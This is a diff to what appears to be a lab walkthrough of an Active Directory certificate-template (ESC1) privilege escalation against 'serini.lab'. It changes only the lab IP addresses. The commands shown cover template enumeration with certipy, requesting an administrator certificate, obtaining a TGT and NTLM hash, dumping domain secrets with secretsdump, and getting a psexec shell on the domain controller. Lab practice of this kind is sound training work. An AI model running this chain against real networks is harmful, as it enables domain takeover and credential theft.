@@ -28,20 +28,20 @@ Before starting the attack, ensure:
 
 ### **Step 1: Enumerate Certificate Templates**
 
-**On Kali (192.168.121.50):**
+**On Kali (192.168.56.50):**
 
 ```bash
 # If certipy was installed with pipx, ensure it's in PATH:
 export PATH="$HOME/.local/bin:$PATH"
 
 # CRITICAL: Ensure time is synced with DC (Kerberos Requirement)
-sudo ntpdate 192.168.121.10
+sudo ntpdate 192.168.56.10
 
 # Find all certificate templates and check for ESC1
-certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.121.10 -vulnerable
+certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.56.10 -vulnerable
 
 # Save output to file
-certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.121.10 -vulnerable -stdout
+certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.56.10 -vulnerable -stdout
 ```
 
 **Expected Output:**
@@ -97,14 +97,14 @@ certipy req -u jdoe@serini.lab -p 'Summer2024!' \
 
 ```bash
 # Add to hosts
-sudo sh -c "echo '192.168.121.20 ca.serini.lab' >> /etc/hosts"
+sudo sh -c "echo '192.168.56.20 ca.serini.lab' >> /etc/hosts"
 
 certipy req -u jdoe@serini.lab -p 'Summer2024!' \
     -ca SERINI-CA \
     -target ca.serini.lab \
     -template VulnUserAuth \
     -upn administrator@serini.lab \
-    -dc-ip 192.168.121.10
+    -dc-ip 192.168.56.10
 ```
 
 **Expected Output:**
@@ -133,10 +133,10 @@ certipy req -u jdoe@serini.lab -p 'Summer2024!' \
 
 ```bash
 # Use the certificate to get a Kerberos TGT for Administrator
-certipy auth -pfx administrator.pfx -dc-ip 192.168.121.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
 
 # If you used DNS name instead:
-certipy auth -pfx administrator.pfx -dc-ip 192.168.121.10 -domain serini.lab
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10 -domain serini.lab
 ```
 
 **Expected Output:**
@@ -171,13 +171,13 @@ export KRB5CCNAME=administrator.ccache
 impacket-secretsdump -k -no-pass serini.lab/administrator@dc.serini.lab
 
 # Option 2: Use the NTLM hash (Pass-the-Hash)
-impacket-secretsdump -hashes :NTLM_HASH_HERE administrator@192.168.121.10
+impacket-secretsdump -hashes :NTLM_HASH_HERE administrator@192.168.56.10
 
 # Option 3: Get a shell on the DC
-impacket-psexec -hashes :NTLM_HASH_HERE administrator@192.168.121.10
+impacket-psexec -hashes :NTLM_HASH_HERE administrator@192.168.56.10
 
 # Option 4: List domain admins
-crackmapexec smb 192.168.121.10 -u administrator -H NTLM_HASH_HERE --users
+crackmapexec smb 192.168.56.10 -u administrator -H NTLM_HASH_HERE --users
 ```
 
 **Expected Output (secretsdump):**
